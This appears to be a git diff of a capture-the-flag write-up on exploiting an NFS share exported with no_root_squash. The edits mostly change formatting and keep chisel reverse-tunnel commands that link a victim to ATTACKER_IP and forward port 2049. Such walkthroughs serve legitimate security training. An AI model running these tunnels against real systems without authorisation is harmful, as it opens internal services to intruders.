@@ -29,7 +29,7 @@ uid=1001(paradox) gid=1001(paradox) groups=1001(paradox)
 
 <br/>
 
-- The `NFS` Service is running Locally **[NFS is using `no_root_squash`].** We can use `SSH Tunneling` or `chisel` to access the Service on our Machine.
+- The `NFS` Service is running Locally **[NFS is using `no_root_squash`].** We can use `SSH Tunneling` or <b style={{ color: 'Coral' }}>chisel</b> to access the Service on our Machine.
 - If `no_root_squash` is used, Remote <b style={{ color: 'Red' }}>ROOT</b> Users are able to change any file on the Shared File System.
 
 ```bash {17-19}
@@ -64,15 +64,18 @@ uid=1001(paradox) gid=1001(paradox) groups=1001(paradox)
 
 <br/>
 
-- **Using `chisel` as a Tunnel**
+### Chisel
 
-:::info CHISEL
+
+- <a class="button button--outline button--info" href="https://github.com/jpillora/chisel">Chisel GitHub</a>
+- Transfer the <b style={{ color: 'Coral' }}>chisel</b> Binary on the Victim Machine.
+
 
 <Tabs>
   <TabItem value="chisel_one" label="Attacker"> 
     <div style={{color: 'red'}}>
 
-```log
+```batch
 chisel server --reverse --port 8000
 ```
 
@@ -81,7 +84,7 @@ chisel server --reverse --port 8000
   <TabItem value="chisel_two" label="Victim">
         <div style={{color: 'red'}}>
 
-```log
+```batch
 chisel client ATTACKER_IP:8000 R:2049:127.0.0.1:2049
 ```
 
@@ -89,7 +92,6 @@ chisel client ATTACKER_IP:8000 R:2049:127.0.0.1:2049
   </TabItem>
 </Tabs>
 
-:::
 
 ---
 
